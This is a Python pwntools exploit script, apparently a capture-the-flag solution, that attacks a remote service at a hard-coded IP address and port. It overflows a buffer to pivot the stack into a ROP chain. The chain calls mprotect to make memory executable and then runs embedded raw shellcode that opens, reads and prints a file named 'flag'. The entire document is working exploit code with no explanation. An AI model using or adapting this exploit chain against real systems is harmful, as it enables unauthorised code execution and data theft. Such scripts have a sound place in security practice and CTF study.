from pwn import *
#----------------------------------------------
# Register pop gadget
pop_rsi     = 0x4021e4 # : pop rsi ; ret
pop_rdx     = 0x450b6d # : pop rdx ; ret
pop_rdi     = 0x4033e1 # : pop rdi ; ret
mtf         = 0x401dc0 # : pop rsp ; ret

# Change RIP gadget
jmp_ptr_rsi = 0x486638 # : jmp qword ptr [rsi]

# Address
nm_rop  = 0x4D7330 # Start of ROP chain in nm
mprotec = 0x452E50 # mprotec address

start_s = 0x4d6000 # start segment for mproc
size_s  = 0x2000   # size that want to set
per_s   = 7        # mode rwx
sh_addr = 0x4d7378 # shellcode's address

# Data
file    = b"flag"
shellcode = b"\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\x20\x73\x4D\x00\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\xC7\xC6\xD0\x73\x4D\x00\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x48\xC7\xC6\xD0\x73\x4D\x00\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x0F\x05"
#----------------------------------------------
# Code Start
p = remote("167.172.80.186", 6666)
p.recvuntil(b"> ")

ROP = file + b"\0"*(16-len(file)) + p64(mtf) 
ROP += p64(pop_rdi) + p64(start_s) 
ROP += p64(pop_rsi) + p64(size_s) 
ROP += p64(pop_rdx) + p64(per_s) 
ROP += p64(mprotec)
ROP += p64(sh_addr) 

p.send(ROP + shellcode)

p.recvuntil(b"> ")

payload = b"I'm weebiii" + b"a"*(0x68-11)
payload += p64(pop_rsi) + p64(nm_rop) 
payload += p64(jmp_ptr_rsi) 
payload += p64(nm_rop + 8)

p.send(payload)

p.interactive()
